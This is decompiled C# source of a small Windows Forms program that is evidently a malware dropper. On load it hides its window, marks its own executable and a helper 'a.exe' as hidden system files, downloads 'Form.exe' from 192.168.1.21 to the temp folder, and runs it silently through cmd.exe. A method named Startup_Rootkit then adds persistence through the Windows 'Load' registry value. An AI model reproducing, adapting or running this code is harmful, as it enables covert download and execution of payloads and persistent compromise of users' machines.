using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Mega;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(120, 0);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 283:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_002e;
						case 6:
							goto IL_0038;
						case 7:
							goto IL_0041;
						case 8:
							goto IL_004f;
						case 9:
							goto IL_006c;
						case 10:
							goto IL_0080;
						case 11:
							goto IL_009e;
						case 12:
							goto IL_00b6;
						case 13:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 14:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00b6:
					num = 12;
					Startup_Rootkit();
					break;
					IL_009e:
					num = 11;
					Interaction.Shell("cmd.exe /c " + text, (AppWinStyle)0, false, -1);
					goto IL_00b6;
					IL_0009:
					num = 2;
					((Control)this).Hide();
					goto IL_0012;
					IL_0012:
					num = 3;
					((Form)this).set_Opacity(0.0);
					goto IL_0024;
					IL_0024:
					num = 4;
					((Form)this).set_ShowIcon(false);
					goto IL_002e;
					IL_002e:
					num = 5;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_0038;
					IL_0038:
					num = 6;
					text2 = "192.168.1.21/Form.exe";
					goto IL_0041;
					IL_0041:
					num = 7;
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden | FileAttributes.System);
					goto IL_004f;
					IL_004f:
					num = 8;
					File.SetAttributes(Path.GetDirectoryName(Application.get_ExecutablePath()) + "/a.exe", FileAttributes.Hidden | FileAttributes.System);
					goto IL_006c;
					IL_006c:
					num = 9;
					text = Path.GetTempPath() + "Form.exe";
					goto IL_0080;
					IL_0080:
					num = 10;
					Interaction.Shell("a.exe -o " + text + " " + text2, (AppWinStyle)0, false, -1);
					goto IL_009e;
					end_IL_0001_2:
					break;
				}
				num = 13;
				Application.Exit();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 283;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Startup_Rootkit()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
		registryKey.SetValue("Load", Application.get_ExecutablePath(), RegistryValueKind.String);
		registryKey.Close();
	}
}
